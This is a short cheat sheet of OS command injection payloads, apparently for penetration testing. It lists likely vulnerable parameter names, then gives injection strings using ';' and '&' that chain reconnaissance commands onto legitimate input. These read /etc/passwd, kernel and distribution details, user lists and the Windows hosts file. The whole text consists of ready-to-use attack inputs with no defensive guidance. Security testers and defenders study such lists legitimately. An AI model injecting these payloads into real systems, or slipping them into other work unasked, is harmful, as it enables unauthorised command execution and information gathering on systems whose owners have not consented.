# OS Command Injection 

## Common Parameters
```bash
cmd, print, run, payload, exec, command, execute, ping, query,
jump, code, reg, do, func, arg, option, load, process, step,
read, function, req, feature, exe, module
```

---

## Linux Commands
```bash
; cat /etc/passwd          # User account information
; cat /etc/issue           # Distribution information
; cat /proc/version        # Kernel version information
; lsb_release -a           # Distribution details
; uname -a                 # Kernel and system information
; ls -la /
; id
; pwd
```
### Alternative Commands Instead Of `/etc/passwd`
```bash
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
```

---

## Windows Commands
```cmd
& dir C:\                                           # Lists root directory
& type C:\Windows\System32\drivers\etc\hosts       # Reads hosts file
& net user                                          # Lists users
& ver                                               # Shows Windows version
& systeminfo                                        # Detailed system information
```

---

## Semicolon (;) - Command Sequencing
```bash
command1 ; command2         # Executes commands sequentially
ping -c 2 127.0.0.1 ; id    # Executes 'ping', then 'id'
echo test ; whoami          # Outputs 'test', then username
```
